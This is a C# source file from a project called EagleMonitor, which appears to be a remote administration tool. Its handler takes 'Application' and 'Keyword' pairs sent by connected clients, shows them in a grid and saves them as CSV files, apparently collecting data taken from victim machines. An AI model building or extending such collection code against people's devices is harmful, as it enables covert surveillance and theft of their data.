using EagleMonitor.Networking;
using EagleMonitor.Utils;
using PacketLib.Packet;
using System.Threading;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{

    internal class KeywordsPacketHandler
    {
        public KeywordsPacketHandler(KeywordsPacket keywordsPacket, ClientHandler clientHandler) 
        {
            new Thread(() =>
            {
                if (keywordsPacket.keywordsList != null)
                {
                    try
                    {
                        if (clientHandler.keywordsForm.dataGridView1 != null)
                        {
                            clientHandler.keywordsForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                            {
                                clientHandler.keywordsForm.dataGridView1.Rows.Clear();
                                foreach (object[] str in keywordsPacket.keywordsList)
                                {
                                    int rowId = clientHandler.keywordsForm.dataGridView1.Rows.Add();
                                    DataGridViewRow row = clientHandler.keywordsForm.dataGridView1.Rows[rowId];
                                    row.Cells["Column1"].Value = str[0].ToString();
                                    row.Cells["Column2"].Value = str[1].ToString();
                                }
                                Miscellaneous.ToCSV(clientHandler.keywordsForm.dataGridView1, clientHandler.clientPath + "\\Keywords\\" + Utils.Miscellaneous.DateFormater() + ".csv");
                                clientHandler.keywordsForm.loadingCircle1.Visible = false;
                                clientHandler.keywordsForm.loadingCircle1.Active = false;
                            }));
                        }
                        else
                        { Miscellaneous.ToCSV(keywordsPacket.keywordsList, clientHandler.clientPath + "\\Keywords\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Keyword" }); }
                    }
                    catch { Miscellaneous.ToCSV(keywordsPacket.keywordsList, clientHandler.clientPath + "\\Keywords\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Keyword" }); }
                }
                else
                    return;
            }).Start();
        }
    }
}
